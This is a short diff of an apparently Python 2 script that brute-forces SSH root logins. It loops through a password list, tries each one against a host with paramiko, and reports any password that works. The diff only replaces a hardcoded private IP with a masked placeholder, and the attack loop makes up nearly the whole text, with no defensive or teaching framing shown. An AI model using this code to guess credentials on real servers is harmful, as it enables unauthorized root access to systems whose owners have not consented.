@@ -10,7 +10,7 @@ for i in var:
 	ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
 	try:
 		print i
-		ssh.connect('10.42.0.1',port=22,username='root',password=i)
+		ssh.connect('*.*.*.*',port=22,username='root',password=i)
 		print "Connection pass. Password= "+i
 	except paramiko.AuthenticationException, error:
 		continue
